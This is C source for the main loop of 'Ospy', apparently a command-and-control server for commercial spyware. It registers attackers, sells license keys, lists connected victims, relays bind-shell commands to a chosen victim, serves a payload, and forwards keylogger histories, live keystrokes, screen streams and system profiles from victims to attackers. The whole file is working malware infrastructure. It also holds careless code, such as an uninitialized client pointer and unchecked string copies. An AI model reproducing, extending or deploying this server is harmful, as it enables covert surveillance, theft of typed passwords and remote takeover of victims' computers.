#include "entering_to_Ospy.h"
#include "connection.h"

int main (){	
	FILE * events_log = fopen("events_log.log", "a");
	if (events_log == NULL){
		printf("Can't opening log file\n");
	}
	time_t time_function = time(NULL);
	char * curr_time;
	curr_time = asctime(localtime(&time_function)); // time function
	fprintf(events_log, "Ospy server started at : %s", curr_time);
	fflush(events_log);
		
	srand(time(0)); // make the random funtion real random
	
	initialize_connection(); 
	
	int num_of_connected_clients = 0;
	client_ptr curr_client; // poss of link list
	
	encrypted_general_message_protocol message;
	registration_status registering_final_status;
	STATUS loging_in_status;
	licenses_key_item licenses_key;
	
	while(1) {
		time_function = time(NULL);
		curr_time = asctime(localtime(&time_function));	
		strtok(curr_time, "\n");
		//clear the socket set 
		FD_ZERO(&readfds);
		
		//add master socket to set
		FD_SET(master_socket, &readfds); 
		max_socket_descriptor = master_socket;
	
		add_child_sockets_to_set(&clients);
			
		//wait for an activity on one of the sockets, timeout is NULL, so wait indefinitely 
		activity = select( max_socket_descriptor + 1 , &readfds , NULL , NULL , NULL); 
		if ((activity < 0) && (errno != EINTR)) 
			fprintf(events_log, "%s : select error", curr_time);
			fflush(events_log);
				
		//If something happened on the master socket, then its an incoming connection 
		if (FD_ISSET(master_socket, &readfds)) { 
			if ((new_socket = accept(master_socket, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) { 
				fprintf(events_log, "%s : accept error", curr_time);
				fflush(events_log);
				exit(EXIT_FAILURE);
				
			}
			fprintf(events_log,"%s : New connection , socket fd is %d , ip is : %s , port : %d\n",curr_time, new_socket, inet_ntoa(address.sin_addr) , ntohs (address.sin_port));
			fflush(events_log);
			
			//add new client to client link list
			insert_client(2, new_socket, 0, "", "", &clients);
			num_of_connected_clients++;
			print_clients_list(clients);
			
			fprintf(events_log, "%s : Adding to list of sockets as %d\n", curr_time, new_socket);
			fflush(events_log);
		}
		
		//else its some IO operation on some other socket 
		for (int i = 0; i < num_of_connected_clients; i++){
			if(curr_client == NULL)
				curr_client = clients; // if way get to the end of the clients link list -> go to the head of the link list
			
			socket_descriptor = curr_client->socket_fd;
			
			if (FD_ISSET( socket_descriptor , &readfds)) {
				//Check if it was for closing , and also read the incoming message
				if (read(socket_descriptor, &message, sizeof(encrypted_general_message_protocol)) == 0) { 
					//Somebody disconnected , get his details and print
					getpeername(socket_descriptor , (struct sockaddr*)&address ,(socklen_t*)&addrlen); 
					fprintf(events_log,"%s : Host disconnected, ip %s , port %d \n",curr_time, inet_ntoa(address.sin_addr), ntohs(address.sin_port)); 
					fflush(events_log);
					
					//Close the socket and mark as 0 in list for urses 
					close(socket_descriptor);
					remove_client(socket_descriptor, &clients); // removeing the disconnected client by his socket_descriptor
					num_of_connected_clients --;
					print_clients_list(clients);
				}
				else {
					if (message.i_am == ATTACKER){
						switch (message.action) {
							case LOG_IN :
								loging_in_status = log_in_attacker(decrypt_text(message.data.encrypted_login_to_Ospy.username, AES_KEY), decrypt_text(message.data.encrypted_login_to_Ospy.password, AES_KEY));
								send(socket_descriptor, &loging_in_status, sizeof(registration_status), 0);
								if (loging_in_status == SUCCESS){// if attacker loged in -connect he's id the hes socket descriptor
									strcpy(curr_client->id, decrypt_text(message.data.encrypted_login_to_Ospy.username, AES_KEY)); // set attackers id = user name
									curr_client->i_am = ATTACKER; // declare this client as attacker
									print_clients_list(clients);
								}
								
								break;
								
							case REGISTER :
								registering_final_status = register_new_attacker(message.data.encrypted_register_to_Ospay.license_key, decrypt_text(message.data.encrypted_register_to_Ospay.username, AES_KEY), decrypt_text(message.data.encrypted_register_to_Ospay.password, AES_KEY));
								
								send(socket_descriptor, &registering_final_status, sizeof(registration_status),0);
								
								break;
								
							case BUY_LICENSE_KEY :
								licenses_key = add_new_license_key();
								send(socket_descriptor, &licenses_key, sizeof(licenses_key_item),0);
							
								break;
							
							case GET_CONNECTED_VICTM :
								send_to_attacker_connected_victims (curr_client, clients, num_of_connected_clients);
								
								break;
								
							case SELECT_VICTIM :
								set_attacker_victim_connection (&curr_client, &clients, num_of_connected_clients, message.data.selected_victim_name);
								break;
								
							case SEND_BIND_SHELL_COMMAND :
								send(curr_client->other_side_sfd, &message.action, sizeof(message.action), 0);
								send(curr_client->other_side_sfd, &message.data.bind_shell_command, sizeof(message.data.bind_shell_command), 0);
								
								break;
							
							case GET_VICTIM_PAYLOAD :
								send_payload_to_attacker(curr_client->socket_fd);									
								
								break;
								
							default :
								send(curr_client->other_side_sfd, &message.action, sizeof(message.action), 0);
								break;	
						}
					}
					else if (message.i_am == VICTIM){
						switch (message.action){
							case LOG_IN :
								strcpy(curr_client->name, decrypt_text(message.data.encrypted_login_vicim_to_Ospy.victim_name, AES_KEY));
								strcpy(curr_client->id, message.data.encrypted_login_vicim_to_Ospy.id);
								curr_client->i_am = VICTIM;
								
								break;
								
							// all these options result in sending back a file to the attacker. the server does nothing more than forwarding it to the right attacker
							case GET_KEYLOGGER_HISTORY :
							case GET_SYSTEM_PROFILER :
							case GET_SCREEN_STREAM :
							case SEND_BIND_SHELL_COMMAND :
								send(curr_client->other_side_sfd, &message.data.file_data, sizeof(message.data.file_data), 0);
								
								break;
								
							case GET_KEYSTROKES_STREAM :
								//printf("\n%s",message.data.keylogger_stream_key);
								send(curr_client->other_side_sfd, message.data.keylogger_stream_key, sizeof(message.data.keylogger_stream_key), 0);
								
								break;	
								
							default :
								
								break;	
						}
					}
				} 
			}
			curr_client = curr_client->next_client;
		} 
	}
	fclose(events_log);
	return 0; 
}